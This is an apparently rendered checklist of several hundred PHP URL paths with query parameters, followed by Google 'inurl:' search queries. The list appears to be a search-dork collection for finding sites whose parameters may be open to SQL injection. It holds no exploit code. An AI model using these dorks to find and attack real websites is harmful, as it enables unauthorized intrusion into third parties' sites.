<li><input disabled="" type="checkbox"> <p>index.php?section=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>en/publications.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/detail.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>forum/profile.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>media/pr.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cloudbank/detail.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pages.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>beitrag_D.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content/index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?i=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>beitrag_F.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pageid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?modul=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?w=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?modus=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>aktuelles/meldungen-detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>obio/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page/de/produkte/produkte.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>packages_display.php?ref=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/index.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modules.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product-range.php?rangeID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>en/news/fullnews.php?newsid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>deal_coupon.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>blog/index.php?idBlog=</p>
</li>
<li><input disabled="" type="checkbox"> <p>redaktion/whiteteeth/detail.php?nr=</p>
</li>
<li><input disabled="" type="checkbox"> <p>HistoryStore/pages/item.php?itemID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>aktuelles/veranstaltungen/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tecdaten/showdetail.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rating/stat.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewapp.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/newsitem.php?newsID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>FernandFaerie/index.php?c=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>categories.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?c=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prod.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>browsepr.php?pr=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product-list.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?ItemID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?c=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>article.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showproduct.php?productId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_item.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>skunkworks/content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_show.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>publications.php?Id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?t=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>portafolio/portafolio.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>YZboard/view.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index_en.php?ref=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index_en.php?ref=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?id_category=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>calendar/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pages/print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pg_t=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>forum/showProfile.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>fr/commande-liste-categorie.php?panier=</p>
</li>
<li><input disabled="" type="checkbox"> <p>downloads/shambler.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>sinformer/n/imprimer.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>More_Details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>directory/contenu.php?id_cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>properties.php?id_cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>forum/showProfile.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>downloads/category.php?c=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product-list.php?category_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?siteid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>projects/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>melbourne_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>idlechat/message.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>brand.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>toynbeestudios/content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show-book.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>property.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view-event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page/venue.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>colourpointeducational/more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>browse/book.php?journalID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>section.php?section=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookDetails.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>profiles/profile.php?profileid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gallery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?CID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>corporate/newsreleases_more.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>county-facts/diary/vcsgen.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>idlechat/message.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>podcast/item.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?act=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?prodId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>socsci/events/full_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ourblog.php?categoryid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>mall/more.php?ProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>archive/get.php?message_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>review/review_form.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>english/publicproducts.php?groupid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news_and_notices.php?news_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rounds-detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gig.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/view.php?no=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?modus=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rss.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?ProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>els/product/product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/description.php?iddesc=</p>
</li>
<li><input disabled="" type="checkbox"> <p>socsci/news_items/full_story.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modules/forum/index.php?topic_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>feature.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/Blitzball.htm?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>profile_print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>questions.php?questionid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>html/scoutnew.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main/index.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p><strong>****</strong>.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p><strong>****</strong>.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?type=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewthread.php?tid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>summary.php?PID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/latest_news.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?CID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>specials.php?osCsid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>search/display.php?BookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>articles.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>newsite/pdf_show.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/category.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopcafe-shop-product.php?bookId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/books_detail.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/books_detail.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>blog.php?blog=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodotti.php?id_cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?CID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>poem_list.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?categoryId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>authorDetails.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>press_release.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_list.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>colourpointeducational/more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>download.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/category.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>i-know/content.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/index.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showproduct.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pageId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?tid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product-list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>onlinesales/product.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>garden_equipment/Fruit-Cage/product.php?pr=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?tid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showsub.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?fid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product-list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?sku=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productList.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_detail.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?categoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modules.php?=</p>
</li>
<li><input disabled="" type="checkbox"> <p>message/comment_threads.php?postID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>artist_art.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?option=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ov_tv.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?lang=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showproduct.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?lang=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?bid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?bid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cps/rde/xchg/tm/hs.xsl/liens_detail.html?lnkId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_show.php?lid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?pagerequested=</p>
</li>
<li><input disabled="" type="checkbox"> <p>downloads.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?intProductID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productList.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?intProductID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>books.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?offs=</p>
</li>
<li><input disabled="" type="checkbox"> <p>mboard/replies.php?parent_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Computer Science.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pdf_post.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>reviews.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>art.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prod.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event_info.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_book.php?CAT=</p>
</li>
<li><input disabled="" type="checkbox"> <p>www/index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>schule/termine.php?view=</p>
</li>
<li><input disabled="" type="checkbox"> <p>goods_detail.php?data=</p>
</li>
<li><input disabled="" type="checkbox"> <p>wiki/pmwiki.php?page*=</p>
</li>
<li><input disabled="" type="checkbox"> <p>summary.php?PID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?grpid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart/product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>db/CART/product_details.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ProductList.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_ranges_view.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cei/cedb/projdetail.php?projID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?DepartmentID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?news=</p>
</li>
<li><input disabled="" type="checkbox"> <p>education/content.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Interior/productlist.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>storemanager/contents/item.php?page_code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>customer/board.htm?mode=</p>
</li>
<li><input disabled="" type="checkbox"> <p>help/com_view.html?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>n_replyboard.php?typeboard=</p>
</li>
<li><input disabled="" type="checkbox"> <p>eng_board/view.php?T****=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prev_results.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bbs/view.php?no=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gnu/?doc=</p>
</li>
<li><input disabled="" type="checkbox"> <p>zb/view.php?uid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>global/product/product.php?gubun=</p>
</li>
<li><input disabled="" type="checkbox"> <p>m_view.php?ps_db=</p>
</li>
<li><input disabled="" type="checkbox"> <p>naboard/memo.php?bd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookmark/mybook/bookmark.php?bookPageNo=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/board.html?table=</p>
</li>
<li><input disabled="" type="checkbox"> <p>kboard/kboard.php?board=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.asp?lotid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>english/board/view****.php?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>goboard/front/board_view.php?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bbs/bbsView.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>boardView.php?bbs=</p>
</li>
<li><input disabled="" type="checkbox"> <p>eng/rgboard/view.php?&amp;bbs_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product/product.php?cate=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?module=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookpage.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> </li>
<li><input disabled="" type="checkbox"> <p>二.</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:item_id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:review.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:hosting_info.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newsid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:iniziativa.php?in=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:gallery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:trainers.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:curriculum.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:rub.php?idr=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news-full.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:labels.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:view_faq.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news_display.php?getid=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:story.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:artikelinfo.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:index2.php?option=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:look.php?ID=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:detail.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:readnews.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newsone.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:index.php?=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:top10.php?cat=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:aboutbook.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:profile_view.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newsone.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:material.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:category.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:event.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:opinions.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:publications.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:product-item.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:announce.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:fellows.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:sql.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:rub.php?idr=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:downloads_info.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:index.php?catid=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:galeri_info.php?l=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:prod_info.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news.php?catid=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:tekst.php?idt=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:shop.php?do=part&amp;id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:index.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newscat.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:productinfo.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newsticker_info.php?idn=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:collectionitem.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:index.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:rubrika.php?idr=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:band_info.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:trainers.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:rubp.php?idr=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:buy.php?category=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:offer.php?idf=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:releases.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:article.php?ID=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:art.php?idm=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:ray.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:play_old.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:title.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:produit.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:declaration_more.php?decl_id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news_view.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:pop.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:pageid=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:select_biblio.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:shopping.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:games.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:humor.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:productdetail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:page.php?file=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:aboutbook.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:post.php?id=</p>
</li>
